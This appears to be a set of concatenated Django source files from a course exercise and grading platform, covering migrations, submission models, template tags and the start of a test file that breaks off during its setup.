                ('order', models.IntegerField(default=0)),
                ('name', models.CharField(max_length=255)),
                ('description', models.TextField(blank=True)),
                ('instructions', models.TextField(blank=True)),
                ('service_url', models.URLField(blank=True)),
            ],
            options={
            },
            bases=('inheritance.modelwithinheritance',),
        ),
        migrations.CreateModel(
            name='BaseExercise',
            fields=[
                ('learningobject_ptr', models.OneToOneField(
                    to='exercise.LearningObject', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
                ('allow_assistant_grading', models.BooleanField(default=False)),
                ('min_group_size', models.PositiveIntegerField(default=1)),
                ('max_group_size', models.PositiveIntegerField(default=1)),
                ('max_submissions', models.PositiveIntegerField(default=10)),
                ('max_points', models.PositiveIntegerField(default=100)),
                ('points_to_pass', models.PositiveIntegerField(default=40)),
            ],
            options={
                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],
            },
            bases=('exercise.learningobject',),
        ),
        migrations.CreateModel(
            name='ExerciseWithAttachment',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(
                    to='exercise.BaseExercise', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),
                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),
            ],
            options={
                'verbose_name_plural': 'exercises with attachment',
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='AsynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(
                    to='exercise.BaseExercise', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='LearningObjectCategory',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('name', models.CharField(max_length=35)),
                ('description', models.TextField(blank=True)),
                ('points_to_pass', models.PositiveIntegerField(default=0)),
                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance', on_delete=models.CASCADE)),
                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='MaxSubmissionsRuleDeviation',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('extra_submissions', models.IntegerField()),
            ],
            options={
                'abstract': False,
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='StaticExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(
                    to='exercise.BaseExercise', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
                ('exercise_page_content', models.TextField()),
                ('submission_page_content', models.TextField()),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.CreateModel(
            name='Submission',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('submission_time', models.DateTimeField(auto_now_add=True)),
                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),
                ('feedback', models.TextField(blank=True)),
                ('assistant_feedback', models.TextField(blank=True)),
                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),
                ('grade', models.IntegerField(default=0)),
                ('grading_time', models.DateTimeField(null=True, blank=True)),
                ('service_points', models.IntegerField(default=0)),
                ('service_max_points', models.IntegerField(default=0)),
                ('submission_data', lib.fields.JSONField(blank=True)),
                ('grading_data', lib.fields.JSONField(blank=True)),
            ],
            options={
                'ordering': ['-submission_time'],
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SubmittedFile',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('param_name', models.CharField(max_length=128)),
                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),
                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.CreateModel(
            name='SynchronousExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(
                    to='exercise.BaseExercise', on_delete=models.CASCADE,
                    parent_link=True, auto_created=True, primary_key=True, serialize=False)),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
        migrations.AddField(
            model_name='submission',
            name='exercise',
            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='grader',
            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True, on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='submission',
            name='submitters',
            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='maxsubmissionsruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='maxsubmissionsruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
        migrations.AlterUniqueTogether(
            name='learningobjectcategory',
            unique_together=set([('name', 'course_instance')]),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='deadlineruledeviation',
            name='submitter',
            field=models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterUniqueTogether(
            name='deadlineruledeviation',
            unique_together=set([('exercise', 'submitter')]),
        ),
    ]
/n/n/nexercise/migrations/0005_auto_20150625_1821.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.utils.timezone


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0004_auto_20150617_1033'),
    ]

    operations = [
        migrations.AlterField(
            model_name='coursemodule',
            name='closing_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='late_submission_deadline',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='coursemodule',
            name='opening_time',
            field=models.DateTimeField(default=django.utils.timezone.now),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='deadlineruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='maxsubmissionsruledeviation',
            name='exercise',
            field=models.ForeignKey(to='exercise.BaseExercise', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/nexercise/migrations/0007_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0006_auto_20150625_1823'),
        ('course', '0005_auto_20150625_1835'),
        ('deviations', '0001_initial')
    ]

    operations = [
        migrations.AlterField(
            model_name='learningobject',
            name='category',
            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory', on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='course_module',
            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule', on_delete=models.CASCADE),
            preserve_default=True,
        ),
    ]
/n/n/nexercise/migrations/0011_auto_20151218_0857.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations
import django.core.validators


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0010_auto_20151214_1714'),
    ]

    operations = [
        migrations.CreateModel(
            name='CourseChapter',
            fields=[
                ('learningobject_ptr', models.OneToOneField(
                    to='exercise.LearningObject', on_delete=models.CASCADE,
                    parent_link=True, primary_key=True, serialize=False, auto_created=True)),
                ('generate_table_of_contents', models.BooleanField(default=False)),
            ],
            options={
            },
            bases=('exercise.learningobject',),
        ),
        migrations.AddField(
            model_name='learningobject',
            name='content_head',
            field=models.TextField(blank=True),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='parent',
            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True, on_delete=models.CASCADE),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='url',
            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\w\\-\\.]*$')],
            blank=True, null=True, default=None),
            preserve_default=True,
        ),
        migrations.AddField(
            model_name='learningobject',
            name='use_wide_column',
            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),
            preserve_default=True,
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='description',
            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),
            preserve_default=True,
        ),
    ]
/n/n/nexercise/migrations/0014_ltiexercise.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('external_services', '0004_auto_20150828_1210'),
        ('exercise', '0013_auto_20151222_1320'),
    ]

    operations = [
        migrations.CreateModel(
            name='LTIExercise',
            fields=[
                ('baseexercise_ptr', models.OneToOneField(
                    to='exercise.BaseExercise', on_delete=models.CASCADE,
                    auto_created=True, primary_key=True, serialize=False, parent_link=True)),
                ('lti_service', models.ForeignKey(to='external_services.LTIService', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=('exercise.baseexercise',),
        ),
    ]
/n/n/nexercise/migrations/0015_auto_20160124_2139.py/n/n# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):

    dependencies = [
        ('userprofile', '0002_auto_20150427_1717'),
        ('exercise', '0014_ltiexercise'),
    ]

    operations = [
        migrations.CreateModel(
            name='LearningObjectDisplay',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('timestamp', models.DateTimeField(auto_now_add=True)),
                ('learning_object', models.ForeignKey(to='exercise.LearningObject', on_delete=models.CASCADE)),
                ('profile', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),
            ],
            options={
            },
            bases=(models.Model,),
        ),
        migrations.AlterField(
            model_name='learningobject',
            name='status',
            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),
            preserve_default=True,
        ),
    ]
/n/n/nexercise/migrations/0035_auto_20190426_1731.py/n/n# -*- coding: utf-8 -*-
# Generated by Django 1.10.8 on 2019-04-26 14:31
from __future__ import unicode_literals

from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ('exercise', '0034_auto_20190416_1133'),
    ]

    operations = [
        migrations.AlterField(
            model_name='submission',
            name='grader',
            field=models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.SET_NULL, related_name='graded_submissions', to='userprofile.UserProfile'),
        ),
    ]
/n/n/nexercise/submission_models.py/n/nimport logging
import os

from django.conf import settings
from django.core.files.storage import default_storage
from django.db import models, DatabaseError
from django.db.models.signals import post_delete
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _
from mimetypes import guess_type

from lib.fields import JSONField, PercentField
from lib.helpers import get_random_string, query_dict_to_list_of_tuples, \
    safe_file_name, Enum
from lib.models import UrlMixin
from userprofile.models import UserProfile
from . import exercise_models


logger = logging.getLogger('aplus.exercise')


class SubmissionManager(models.Manager):

    def get_queryset(self):
        return super().get_queryset()\
            .prefetch_related('submitters')

    def create_from_post(self, exercise, submitters, request):
        new_submission = Submission.objects.create(
            exercise=exercise,
            submission_data=query_dict_to_list_of_tuples(request.POST)
        )
        new_submission.submitters = submitters
        try:
            new_submission.add_files(request.FILES)
        except DatabaseError:
            logger.exception(""Failed to save submitted files: %s %s"",
                request.user.username, exercise);
            new_submission.delete()
            return None
        return new_submission

    def exclude_errors(self):
        return self.exclude(status__in=(
            Submission.STATUS.ERROR,
            Submission.STATUS.REJECTED,
        ))


class Submission(UrlMixin, models.Model):
    """"""
    A submission to some course exercise from one or more submitters.
    """"""
    STATUS = Enum([
        ('INITIALIZED', 'initialized', _(""Initialized"")),
        ('WAITING', 'waiting', _(""In grading"")),
        ('READY', 'ready', _(""Ready"")), # graded normally
        ('ERROR', 'error', _(""Error"")),
        ('REJECTED', 'rejected', _(""Rejected"")), # missing fields etc
        ('UNOFFICIAL', 'unofficial', _(""No effect on grading"")),
        # unofficial: graded after the deadline or after exceeding the submission limit
    ])
    submission_time = models.DateTimeField(auto_now_add=True)
    hash = models.CharField(max_length=32, default=get_random_string)

    # Relations
    exercise = models.ForeignKey(exercise_models.BaseExercise,
        on_delete=models.CASCADE,
        related_name=""submissions"")
    submitters = models.ManyToManyField(UserProfile,
        related_name=""submissions"")
    grader = models.ForeignKey(UserProfile, on_delete=models.SET_NULL,
        related_name=""graded_submissions"", blank=True, null=True)

    # Grading and feedback
    feedback = models.TextField(blank=True)
    assistant_feedback = models.TextField(blank=True)
    status = models.CharField(max_length=32,
        choices=STATUS.choices, default=STATUS.INITIALIZED)
    grade = models.IntegerField(default=0)
    grading_time = models.DateTimeField(blank=True, null=True)
    late_penalty_applied = PercentField(blank=True, null=True)

    # Points received from assessment, before scaled to grade
    service_points = models.IntegerField(default=0)
    service_max_points = models.IntegerField(default=0)

    # Additional data
    submission_data = JSONField(blank=True)
    grading_data = JSONField(blank=True)

    objects = SubmissionManager()

    class Meta:
        app_label = 'exercise'
        ordering = ['-id']

    def __str__(self):
        return str(self.id)

    def ordinal_number(self):
        return self.submitters.first().submissions.exclude_errors().filter(
            exercise=self.exercise,
            submission_time__lt=self.submission_time
        ).count() + 1

    def is_submitter(self, user):
        return user and user.is_authenticated and \
            self.submitters.filter(id=user.userprofile.id).exists()

    def add_files(self, files):
        """"""
        Adds the given files to this submission as SubmittedFile objects.

        @param files: a QueryDict containing files from a POST request
        """"""
        for key in files:
            for uploaded_file in files.getlist(key):
                self.files.create(
                    file_object=uploaded_file,
                    param_name=key,
                )

    def get_post_parameters(self, request, url):
        """"""
        Produces submission data for POST as (data_dict, files_dict).
        """"""
        self._data = {}
        for (key, value) in self.submission_data or {}:
            if key in self._data:
                self._data[key].append(value)
            else:
                self._data[key] = [ value ]

        self._files = {}
        for file in self.files.all().order_by(""id""):
            # Requests supports only one file per name in a multipart post.
            self._files[file.param_name] = (
                file.filename,
                open(file.file_object.path, ""rb"")
            )

        students = list(self.submitters.all())
        if self.is_submitter(request.user):
            user = request.user
        else:
            user = students[0].user if students else None
        self.exercise.as_leaf_class().modify_post_parameters(
            self._data, self._files, user, students, request, url)
        return (self._data, self._files)

    def clean_post_parameters(self):
        for key in self._files.keys():
            self._files[key][1].close()
        del self._files
        del self._data

    def set_points(self, points, max_points, no_penalties=False):
        """"""
        Sets the points and maximum points for this submissions. If the given
        maximum points are different than the ones for the exercise this
        submission is for, the points will be scaled.

        The method also checks if the submission is late and if it is, by
        default applies the late_submission_penalty set for the
        exercise.course_module. If no_penalties is True, the penalty is not
        applied.
        """"""
        exercise = self.exercise

        # Evade bad max points in remote service.
        if max_points == 0 and points > 0:
            max_points = exercise.max_points

        # The given points must be between zero and max points
        assert 0 <= points <= max_points

        # If service max points is zero, then exercise max points must be zero
        # too because otherwise adjusted_grade would be ambiguous.
        # Disabled: Teacher is always responsible the exercise can be passed.
        #assert not (max_points == 0 and self.exercise.max_points != 0)

        self.service_points = points
        self.service_max_points = max_points
        self.late_penalty_applied = None

        # Scale the given points to the maximum points for the exercise
        if max_points > 0:
            adjusted_grade = (1.0 * exercise.max_points * points / max_points)
        else:
            adjusted_grade = 0.0

        if not no_penalties:
            timing,_ = exercise.get_timing(self.submitters.all(), self.submission_time)
            if timing in (exercise.TIMING.LATE, exercise.TIMING.CLOSED_AFTER):
                self.late_penalty_applied = (
                    exercise.course_module.late_submission_penalty if
                    exercise.course_module.late_submissions_allowed else 0
                )
                adjusted_grade -= (adjusted_grade * self.late_penalty_applied)
            elif timing == exercise.TIMING.UNOFFICIAL:
                self.status = self.STATUS.UNOFFICIAL
            if self.exercise.no_submissions_left(self.submitters.all()):
                self.status = self.STATUS.UNOFFICIAL

        self.grade = round(adjusted_grade)

        # Finally check that the grade is in bounds after all the math.
        assert 0 <= self.grade <= self.exercise.max_points

    def scale_grade_to(self, percentage):
        percentage = float(percentage)/100
        self.grade = round(max(self.grade*percentage,0))
        self.grade = min(self.grade,self.exercise.max_points)

    def set_waiting(self):
        self.status = self.STATUS.WAITING

    def set_ready(self):
        self.grading_time = timezone.now()
        if self.status != self.STATUS.UNOFFICIAL:
            self.status = self.STATUS.READY

        # Fire set hooks.
        for hook in self.exercise.course_module.course_instance \
                .course_hooks.filter(hook_type=""post-grading""):
            hook.trigger({
                ""submission_id"": self.id,
                ""exercise_id"": self.exercise.id,
                ""course_id"": self.exercise.course_module.course_instance.id,
                ""site"": settings.BASE_URL,
            })

    def set_rejected(self):
        self.status = self.STATUS.REJECTED

    def set_error(self):
        self.status = self.STATUS.ERROR

    @property
    def is_graded(self):
        return self.status in (self.STATUS.READY, self.STATUS.UNOFFICIAL)

    ABSOLUTE_URL_NAME = ""submission""

    def get_url_kwargs(self):
        return dict(submission_id=self.id, **self.exercise.get_url_kwargs())

    def get_inspect_url(self):
        return self.get_url(""submission-inspect"")


def build_upload_dir(instance, filename):
    """"""
    Returns the path to a directory where a file should be saved.
    This is called every time a new SubmittedFile model is created.

    @param instance: the new SubmittedFile object
    @param filename: the actual name of the submitted file
    @return: a path where the file should be stored, relative to MEDIA_ROOT directory
    """"""
    submission = instance.submission
    exercise = submission.exercise
    submitter_ids = [str(profile.id) for profile in submission.submitters.all().order_by(""id"")]
    return ""course_instance_{:d}/submissions/exercise_{:d}/users_{}/submission_{:d}/{}"".format(
        exercise.course_instance.id,
        exercise.id,
        ""-"".join(submitter_ids),
        submission.id,
        safe_file_name(filename)
    )


class SubmittedFile(UrlMixin, models.Model):
    """"""
    Represents a file submitted by the student as a solution to an exercise.
    Submitted files are always linked to a certain submission through a
    foreign key relation. The files are stored on the disk while models are
    stored in the database.
    """"""
    PASS_MIME = ( ""image/jpeg"", ""image/png"", ""image/gif"", ""application/pdf"" )
    submission = models.ForeignKey(Submission, on_delete=models.CASCADE,
        related_name=""files"")
    param_name = models.CharField(max_length=128)
    file_object = models.FileField(upload_to=build_upload_dir, max_length=255)

    class Meta:
        app_label = 'exercise'

    @property
    def filename(self):
        """"""
        Returns the actual name of the file on the disk.
        """"""
        return os.path.basename(self.file_object.path)

    def get_mime(self):
        return guess_type(self.file_object.path)[0]

    def is_passed(self):
        return self.get_mime() in SubmittedFile.PASS_MIME


    ABSOLUTE_URL_NAME = ""submission-file""

    def get_url_kwargs(self):
        return dict(
            file_id=self.id,
            file_name=self.filename,
            **self.submission.get_url_kwargs())


def _delete_file(sender, instance, **kwargs):
    """"""
    Deletes the actual submission files after the submission in database is
    removed.
    """"""
    default_storage.delete(instance.file_object.path)
post_delete.connect(_delete_file, SubmittedFile)
/n/n/nexercise/templatetags/exercise.py/n/nimport json
from django import template
from django.db.models import Max, Min
from django.template.loader import render_to_string
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _

from course.models import CourseModule
from lib.errors import TagUsageError
from ..cache.content import CachedContent
from ..cache.points import CachedPoints
from ..exercise_summary import UserExerciseSummary
from ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise


register = template.Library()


def _prepare_now(context):
    if not 'now' in context:
        context['now'] = timezone.now()
    return context['now']


def _prepare_context(context, student=None):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']
    _prepare_now(context)
    if not 'content' in context:
        context['content'] = CachedContent(instance)
    def points(user, key):
        if not key in context:
            context[key] = CachedPoints(instance, user, context['content'])
        return context[key]
    if student:
        return points(student, 'studentpoints')
    return points(context['request'].user, 'points')


def _get_toc(context, student=None):
    points = _prepare_context(context, student)
    context = context.flatten()
    context.update({
        'modules': points.modules_flatted(),
        'categories': points.categories(),
        'total': points.total(),
        'is_course_staff': context.get('is_course_staff', False),
    })
    return context


@register.inclusion_tag(""exercise/_user_results.html"", takes_context=True)
def user_results(context, student=None):
    values = _get_toc(context, student)
    values['total_json'] = json.dumps(values['total'])
    if student:
        values['is_course_staff'] = False
    return values


@register.inclusion_tag(""exercise/_user_toc.html"", takes_context=True)
def user_toc(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag(""exercise/_user_last.html"", takes_context=True)
def user_last(context):
    user = context['request'].user
    points = _prepare_context(context)
    if user.is_authenticated:
        last = LearningObjectDisplay.objects.filter(
            profile=user.userprofile,
            learning_object__status=LearningObject.STATUS.READY,
            learning_object__course_module__course_instance=context['instance'],
        ).select_related('learning_object').order_by('-timestamp').first()
        if last:
            entry,_,_,_ = points.find(last.learning_object)
            return {
                'last': entry,
                'last_time': last.timestamp,
            }
    return {
        'begin': points.begin(),
        'instance': context['instance'],
    }


@register.inclusion_tag(""exercise/_category_points.html"", takes_context=True)
def category_points(context, student=None):
    return _get_toc(context, student)


@register.inclusion_tag(""exercise/_submission_list.html"", takes_context=True)
def latest_submissions(context):
    submissions = context[""profile""].submissions \
        .filter(exercise__course_module__course_instance=context[""instance""]) \
        .order_by(""-id"")[:10]
    return {
        ""submissions"": submissions,
        ""title"": _(""Latest submissions""),
        ""empty"": _(""No submissions for this course.""),
    }


@register.filter
def max_submissions(exercise, user_profile):
    return exercise.max_submissions_for_student(user_profile)


@register.filter
def percent(decimal):
    return int(decimal * 100)


@register.filter
def submission_status(status):
    return Submission.STATUS[status]


def _points_data(obj, classes=None):
    if isinstance(obj, UserExerciseSummary):
        exercise = obj.exercise
        data = {
            'points': obj.get_points(),
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.is_missing_points(),
            'passed': obj.is_passed(),
            'full_score': obj.is_full_points(),
            'submitted': obj.is_submitted(),
            'graded': obj.is_graded(),
            'official': not obj.is_unofficial(),
            'exercise_page': True,
        }
    elif isinstance(obj, Submission):
        exercise = obj.exercise
        data = {
            'points': obj.grade,
            'max': exercise.max_points,
            'difficulty': exercise.difficulty,
            'required': exercise.points_to_pass,
            'confirm_the_level': exercise.category.confirm_the_level,
            'missing_points': obj.grade < exercise.points_to_pass,
            'passed': obj.grade >= exercise.points_to_pass,
            'full_score': obj.grade >= exercise.max_points,
            'submitted': True,
            'graded': obj.is_graded,
            'official': obj.status != Submission.STATUS.UNOFFICIAL,
        }
        if not obj.is_graded and (
                    not exercise.category.confirm_the_level
                    or obj.status != Submission.STATUS.WAITING
                ):
            data['status'] = obj.status
    else:
        points = obj.get('points', 0)
        max_points = obj.get('max_points', 0)
        required = obj.get('points_to_pass', 0)
        data = {
            'points': points,
            'max': max_points,
            'difficulty': obj.get('difficulty', ''),
            'required': required,
            'confirm_the_level': obj.get('confirm_the_level', False),
            'missing_points': points < required,
            'passed': obj.get('passed', True),
            'full_score': points >= max_points,
            'submitted': obj.get('submission_count', 0) > 0,
            'graded': obj.get('graded', True),
            'status': obj.get('submission_status', False),
            'unconfirmed': obj.get('unconfirmed', False),
            'official': not obj.get('unofficial', False),
            'confirmable_points': obj.get('confirmable_points', False),
        }
    percentage = 0
    required_percentage = None
    if data['max'] > 0:
        percentage = int(round(100.0 * data['points'] / data['max']))
        if data['required']:
            required_percentage = int(round(100.0 * data['required'] / data['max']))
    data.update({
        'classes': classes,
        'percentage': percentage,
        'required_percentage': required_percentage,
    })
    return data


@register.inclusion_tag(""exercise/_points_progress.html"")
def points_progress(obj):
    return _points_data(obj)


@register.inclusion_tag(""exercise/_points_badge.html"")
def points_badge(obj, classes=None):
    return _points_data(obj, classes)


@register.assignment_tag(takes_context=True)
def max_group_size(context):
    points = _prepare_context(context)
    return points.total()['max_group_size']


@register.assignment_tag(takes_context=True)
def min_group_size(context):
    points = _prepare_context(context)
    return points.total()['min_group_size']


@register.assignment_tag(takes_context=True)
def module_accessible(context, entry):
    t = entry.get('opening_time')
    if t and t > _prepare_now(context):
        return False
    if entry.get('requirements'):
        points = _prepare_context(context)
        module = CourseModule.objects.get(id=entry['id'])
        return module.are_requirements_passed(points)
    return True


@register.assignment_tag
def get_grading_errors(submission):
    if not isinstance(submission.grading_data, dict):
        return """"
    grading_data = submission.grading_data.get('grading_data')
    if not isinstance(grading_data, str):
        return """"
    if grading_data.startswith('<pre>'):
        return grading_data[5:-6]
    try:
        return json.loads(grading_data).get('errors', """")
    except (AttributeError, TypeError, ValueError):
        return """"


@register.inclusion_tag(""exercise/_text_stats.html"", takes_context=True)
def exercise_text_stats(context, exercise):
    if not 'instance' in context:
        raise TagUsageError()
    instance = context['instance']

    if not 'student_count' in context:
        context['student_count'] = instance.students.count()
    total = context['student_count']

    if isinstance(exercise, int):
        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()
    else:
        num = exercise.number_of_submitters() if exercise else 0
    return {
        ""number"": num,
        ""percentage"": int(100 * num / total) if total else 0,
    }

@register.simple_tag
def get_format_info(format):
    format_infos = {
        'json' : {
            'name': 'json',
            'verbose_name': 'JSON',
        },
        'csv': {
            'name': 'csv',
            'verbose_name': 'CSV',
        },
        'excel.csv': {
            'name': 'excel.csv',
            'verbose_name': _('Excel compatible CSV'),
        },
    }
    try:
        return format_infos[format]
    except KeyError as e:
        raise RuntimeError('Invalid format: \'{}\''.format(format)) from e

@register.simple_tag
def get_format_info_list(formats):
    return [get_format_info(format) for format in formats.split()]
/n/n/nexercise/tests.py/n/nfrom datetime import datetime, timedelta
import json
import os.path
import urllib

from django.conf import settings
from django.contrib.auth.models import User
from django.core.exceptions import ValidationError
from django.urls import reverse
from django.test import TestCase
from django.test.client import RequestFactory
from django.utils import timezone
from django.utils.datastructures import MultiValueDict

from course.models import Course, CourseInstance, CourseHook, CourseModule, \
    LearningObjectCategory
from deviations.models import DeadlineRuleDeviation, \
    MaxSubmissionsRuleDeviation
from exercise.exercise_summary import UserExerciseSummary
from exercise.models import BaseExercise, StaticExercise, \
    ExerciseWithAttachment, Submission, SubmittedFile, LearningObject
from exercise.protocol.exercise_page import ExercisePage


class ExerciseTest(TestCase):
    def setUp(self):
        self.user = User(username=""testUser"", first_name=""First"", last_name=""Last"")
        self.user.set_password(""testPassword"")
        self.user.save()

        self.grader = User(username=""grader"")
        self.grader.set_password(""graderPassword"")
        self.grader.save()

        self.teacher = User(username=""staff"", is_staff=True)
        self.teacher.set_password(""staffPassword"")
        self.teacher.save()

        self.user2 = User(username=""testUser2"", first_name=""Strange"", last_name=""Fellow"")
        self.user2.set_password(""testPassword2"")
        self.user2.save()

        self.course = Course.objects.create(
            name=""test course"",
            code=""123456"",
            url=""Course-Url""
        )
        self.course.teachers.add(self.teacher.userprofile)

        self.today = timezone.now()
        self.yesterday = self.today - timedelta(days=1)
        self.tomorrow = self.today + timedelta(days=1)
        self.two_days_from_now = self.tomorrow + timedelta(days=1)
        self.three_days_from_now = self.two_days_from_now + timedelta(days=1)

        self.course_instance = CourseInstance.objects.create(
            instance_name=""Fall 2011 day 1"",
            starting_time=self.today,
            ending_time=self.tomorrow,
            course=self.course,
            url=""T-00.1000_d1"",
            view_content_to=CourseInstance.VIEW_ACCESS.ENROLLMENT_AUDIENCE,
        )
        self.course_instance.assistants.add(self.grader.userprofile)

        self.course_module = CourseModule.objects.create(
            name=""test module"",
            url=""test-module"",
            points_to_pass=15,
            course_instance=self.course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow
        )

        self.course_module_with_late_submissions_allowed = CourseModule.objects.create(
            name=""test module"",
            url=""test-module-late"",
            points_to_pass=50,
            course_instance=self.course_instance,
            opening_time=self.today,
            closing_time=self.tomorrow,
            late_submissions_allowed=True,
            late_submission_deadline=self.two_days_from_now,
            late_submission_penalty=0.2
        )

        self.old_course_module = CourseModule.objects.create(
            name=""test module"",
            url=""test-module-old"",
            points_to_pass=15,
            course_instance=self.course_instance,
            opening_time=self.yesterday,
            closing_time=self.today
        )

        self.learning_object_category = LearningObjectCategory.objects.create(
            name=""test category"",
            course_instance=self.course_instance,
            points_to_pass=5
        )

        self.hidden_learning_object_category = LearningObjectCategory.objects.create(
            name=""hidden category"",
            course_instance=self.course_instance
        )
        #self.hidden_learning_object_category.hidden_to.add(self.user.userprofile)

        self.learning_object = LearningObject.objects.create(
            name=""test learning object"",
            course_module=self.course_module,
            category=self.learning_object_category,
            url=""l1"",
        )

